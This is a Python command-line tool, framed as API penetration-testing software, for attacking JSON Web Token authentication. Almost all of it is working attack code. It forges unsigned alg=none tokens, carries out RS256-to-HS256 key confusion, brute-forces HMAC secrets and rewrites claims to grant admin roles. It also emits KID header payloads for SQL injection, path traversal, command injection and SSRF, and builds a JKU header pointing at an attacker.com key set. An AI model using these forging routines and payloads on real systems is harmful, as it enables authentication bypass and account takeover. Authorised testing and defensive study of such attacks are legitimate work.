"""
JWT Attack Tool — VAPT API Security Testing

Attacks:
  none          Forge token with alg=none (no signature)
  confusion     Algorithm confusion RS256→HS256
  bruteforce    Brute-force weak HMAC secret
  tamper        Modify claims (sub, role, admin, exp)
  kid           KID header injection payloads
  jku           JKU header injection payload

Usage:
  python -I jwt_attacks.py --token <jwt> --attack none
  python -I jwt_attacks.py --token <jwt> --attack bruteforce --wordlist jwt_common_secrets.txt
  python -I jwt_attacks.py --token <jwt> --attack tamper --claim role=admin --claim is_admin=true
  python -I jwt_attacks.py --token <jwt> --attack confusion --public-key pubkey.pem
  python -I jwt_attacks.py --token <jwt> --attack kid
  python -I jwt_attacks.py decode --token <jwt>

Requires: pip install PyJWT cryptography
"""

import argparse
import base64
import hashlib
import hmac
import json
import sys
import time


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    s += "=" * (4 - len(s) % 4)
    return base64.urlsafe_b64decode(s)


def split_token(token: str):
    parts = token.strip().split(".")
    if len(parts) != 3:
        print("[-] Invalid JWT (expected 3 parts)")
        sys.exit(1)
    header = json.loads(b64url_decode(parts[0]))
    payload = json.loads(b64url_decode(parts[1]))
    return header, payload, parts


def forge_token(header: dict, payload: dict, signature: bytes = b"") -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    s = b64url_encode(signature) if signature else ""
    return f"{h}.{p}.{s}"


def hmac_sign(header: dict, payload: dict, secret: bytes) -> str:
    h = b64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = b64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    if header.get("alg") == "HS384":
        sig = hmac.new(secret, signing_input, hashlib.sha384).digest()
    elif header.get("alg") == "HS512":
        sig = hmac.new(secret, signing_input, hashlib.sha512).digest()
    else:
        sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{b64url_encode(sig)}"


# ============================================================
# Attack: None Algorithm
# ============================================================

def attack_none(token: str):
    header, payload, _ = split_token(token)
    print(f"[*] Original algorithm: {header.get('alg')}")
    print(f"[*] Original payload: {json.dumps(payload, indent=2)}")

    none_variants = ["none", "None", "NONE", "nOnE", "nonE", "NoNe"]
    print(f"\n[*] Generating {len(none_variants)} none-algorithm tokens:\n")

    for variant in none_variants:
        new_header = dict(header)
        new_header["alg"] = variant
        # Three formats: empty sig, no sig, dot
        token_empty = forge_token(new_header, payload, b"")
        token_nosig = f"{b64url_encode(json.dumps(new_header, separators=(',',':')).encode())}.{b64url_encode(json.dumps(payload, separators=(',',':')).encode())}."

        print(f"  alg={variant} (empty sig):")
        print(f"    {token_empty}")
        print(f"  alg={variant} (trailing dot):")
        print(f"    {token_nosig}")
        print()


# ============================================================
# Attack: Algorithm Confusion (RS256 → HS256)
# ============================================================

def attack_confusion(token: str, public_key_path: str):
    header, payload, _ = split_token(token)
    print(f"[*] Original algorithm: {header.get('alg')}")

    if not public_key_path:
        print("[-] --public-key required for confusion attack")
        print("[*] Get the public key from:")
        print("    - /.well-known/jwks.json")
        print("    - /api/v1/auth/jwks")
        print("    - SSL certificate of the server")
        print("    - openssl s_client -connect target:443 | openssl x509 -pubkey -noout")
        return

    with open(public_key_path, "rb") as f:
        public_key = f.read()

    new_header = {"alg": "HS256", "typ": "JWT"}
    forged = hmac_sign(new_header, payload, public_key)

    print(f"[+] Forged token (RS256→HS256, signed with public key as HMAC secret):")
    print(f"    {forged}")
    print(f"\n[*] This works when the server uses the same key variable for both RSA verify and HMAC verify.")


# ============================================================
# Attack: Brute-force HMAC Secret
# ============================================================

def attack_bruteforce(token: str, wordlist_path: str):
    header, payload, parts = split_token(token)
    alg = header.get("alg", "HS256")

    if alg not in ("HS256", "HS384", "HS512"):
        print(f"[-] Algorithm {alg} is not HMAC-based. Bruteforce not applicable.")
        return

    signing_input = f"{parts[0]}.{parts[1]}".encode()
    target_sig = b64url_decode(parts[2])

    hash_func = {"HS256": hashlib.sha256, "HS384": hashlib.sha384, "HS512": hashlib.sha512}[alg]

    if not wordlist_path:
        wordlist_path = "jwt_common_secrets.txt"

    print(f"[*] Brute-forcing {alg} secret using: {wordlist_path}")

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            secrets = [line.strip() for line in f if line.strip() and not line.startswith("#")]
    except FileNotFoundError:
        print(f"[-] Wordlist not found: {wordlist_path}")
        print(f"[*] Use --wordlist or place jwt_common_secrets.txt in current directory")
        return

    print(f"[*] Testing {len(secrets)} secrets...")

    for i, secret in enumerate(secrets):
        computed = hmac.new(secret.encode(), signing_input, hash_func).digest()
        if hmac.compare_digest(computed, target_sig):
            print(f"\n[+] SECRET FOUND: {secret}")
            print(f"[+] Tested {i+1} secrets")
            print(f"\n[*] Forge new tokens with:")
            print(f'    python -I jwt_attacks.py --token <jwt> --attack tamper --secret "{secret}" --claim role=admin')
            return

    print(f"[-] Secret not found after {len(secrets)} attempts")


# ============================================================
# Attack: Claim Tampering
# ============================================================

def attack_tamper(token: str, claims: list, secret: str = None):
    header, payload, _ = split_token(token)
    print(f"[*] Original payload: {json.dumps(payload, indent=2)}")

    for claim in claims:
        if "=" not in claim:
            print(f"[-] Invalid claim format: {claim} (use key=value)")
            continue
        key, value = claim.split("=", 1)
        # Try to parse value as JSON (for booleans, numbers)
        try:
            value = json.loads(value)
        except (json.JSONDecodeError, ValueError):
            pass
        payload[key] = value

    # Extend expiration
    if "exp" not in [c.split("=")[0] for c in claims]:
        payload["exp"] = int(time.time()) + 86400 * 365  # 1 year from now

    print(f"\n[*] Tampered payload: {json.dumps(payload, indent=2)}")

    if secret:
        forged = hmac_sign(header, payload, secret.encode())
        print(f"\n[+] Forged (signed with known secret):")
        print(f"    {forged}")
    else:
        # Generate with none algorithm
        none_header = dict(header)
        none_header["alg"] = "none"
        forged = forge_token(none_header, payload)
        print(f"\n[+] Forged (alg=none, unsigned):")
        print(f"    {forged}")
        print(f"\n[*] To sign properly, provide --secret <known_secret>")

    # Common privilege escalation claims
    print(f"\n[*] Common claims to try:")
    print(f'    --claim role=admin --claim is_admin=true')
    print(f'    --claim sub=1 --claim user_id=1')
    print(f'    --claim scope="admin read write"')
    print(f'    --claim groups=["admin","superuser"]')


# ============================================================
# Attack: KID Injection
# ============================================================

def attack_kid(token: str):
    header, payload, _ = split_token(token)
    print(f"[*] Original header: {json.dumps(header, indent=2)}")

    kid_payloads = [
        ("Path traversal to /dev/null (empty key)", "../../dev/null", ""),
        ("Path traversal to /dev/null (aa prefix)", "../../../../../../dev/null", "AA=="),
        ("SQL injection in KID", "' UNION SELECT 'secret' -- ", "secret"),
        ("SQL injection (key from value)", "' UNION SELECT 'aaa' FROM dual -- ", "aaa"),
        ("Command injection", "| calc.exe", ""),
        ("SSRF via KID", "https://attacker.com/jwks/key1", ""),
        ("Path traversal to known file", "../../../etc/hostname", ""),
        ("Empty key", "", ""),
    ]

    print(f"\n[*] KID injection payloads:\n")
    for desc, kid, signing_key in kid_payloads:
        new_header = dict(header)
        new_header["kid"] = kid
        new_header["alg"] = "HS256"

        if signing_key:
            forged = hmac_sign(new_header, payload, signing_key.encode())
        else:
            forged = hmac_sign(new_header, payload, b"")

        print(f"  [{desc}]")
        print(f"  kid: {kid}")
        print(f"  Token: {forged}")
        print()


# ============================================================
# Attack: JKU Header Injection
# ============================================================

def attack_jku(token: str):
    header, payload, _ = split_token(token)

    print("[*] JKU (JWK Set URL) Injection")
    print("[*] The server fetches the signing key from the URL in the JKU header.")
    print("[*] If it doesn't validate the JKU URL, you can point it to your server.\n")

    attacker_url = "https://attacker.com/.well-known/jwks.json"

    print("[*] Steps:")
    print(f"  1. Generate an RSA keypair:")
    print(f"     openssl genrsa -out attacker.pem 2048")
    print(f"     openssl rsa -in attacker.pem -pubout -out attacker_pub.pem")
    print(f"  2. Create a JWKS file with your public key and host it:")
    print(f"     python -m http.server 8080")
    print(f"  3. Set the JKU header to your server URL:")
    print(f"  4. Sign the token with your private key")

    new_header = dict(header)
    new_header["jku"] = attacker_url
    new_header["alg"] = "RS256"

    print(f"\n[*] Tampered header:")
    print(f"    {json.dumps(new_header, indent=2)}")

    print(f"\n[*] JWKS format to host on {attacker_url}:")
    jwks_template = {
        "keys": [{
            "kty": "RSA",
            "kid": header.get("kid", "attacker-key-1"),
            "use": "sig",
            "n": "<BASE64URL_MODULUS>",
            "e": "AQAB"
        }]
    }
    print(f"    {json.dumps(jwks_template, indent=4)}")

    print(f"\n[*] Sign with: ")
    print(f"    import jwt")
    print(f'    jwt.encode(payload, open("attacker.pem").read(), algorithm="RS256", headers={{"jku": "{attacker_url}"}})')


# ============================================================
# Decode
# ============================================================

def decode_token(token: str):
    header, payload, parts = split_token(token)
    print("[*] JWT Decoded:\n")
    print(f"  Header: {json.dumps(header, indent=4)}")
    print(f"\n  Payload: {json.dumps(payload, indent=4)}")
    print(f"\n  Signature: {parts[2][:40]}...")

    if "exp" in payload:
        exp = payload["exp"]
        now = int(time.time())
        if exp < now:
            print(f"\n  [!] Token EXPIRED at {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(exp))} ({now - exp}s ago)")
        else:
            print(f"\n  [+] Token expires at {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(exp))} ({exp - now}s remaining)")

    if "iat" in payload:
        print(f"  [*] Issued at: {time.strftime('%Y-%m-%d %H:%M:%S', time.gmtime(payload['iat']))}")

    # Flag interesting claims
    interesting = ["admin", "is_admin", "isAdmin", "role", "roles", "scope",
                   "permissions", "group", "groups", "privilege", "user_type"]
    for claim in interesting:
        if claim in payload:
            print(f"  [!] Interesting claim: {claim} = {payload[claim]}")


# ============================================================
# Main
# ============================================================

def main():
    parser = argparse.ArgumentParser(description="JWT Attack Tool for API VAPT")
    parser.add_argument("--token", "-t", required=True, help="JWT token to attack")
    parser.add_argument("--attack", "-a", default="decode",
                        choices=["none", "confusion", "bruteforce", "tamper", "kid", "jku", "decode"],
                        help="Attack type")
    parser.add_argument("--wordlist", "-w", help="Wordlist for bruteforce attack")
    parser.add_argument("--public-key", "-p", help="Public key file for confusion attack")
    parser.add_argument("--claim", "-c", action="append", default=[],
                        help="Claim to tamper (key=value), can be repeated")
    parser.add_argument("--secret", "-s", help="Known secret for signing tampered tokens")
    args = parser.parse_args()

    attacks = {
        "decode": lambda: decode_token(args.token),
        "none": lambda: attack_none(args.token),
        "confusion": lambda: attack_confusion(args.token, args.public_key),
        "bruteforce": lambda: attack_bruteforce(args.token, args.wordlist),
        "tamper": lambda: attack_tamper(args.token, args.claim, args.secret),
        "kid": lambda: attack_kid(args.token),
        "jku": lambda: attack_jku(args.token),
    }

    print(f"[*] JWT Attack Tool — {args.attack.upper()}\n")
    attacks[args.attack]()


if __name__ == "__main__":
    main()
